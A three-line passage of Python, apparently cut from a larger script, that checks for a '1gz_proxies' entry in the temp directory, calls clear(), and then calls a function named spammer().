                    if not os.path.exists(getTempDir()+"\\1gz_proxies"):
                        clear()
spammer()
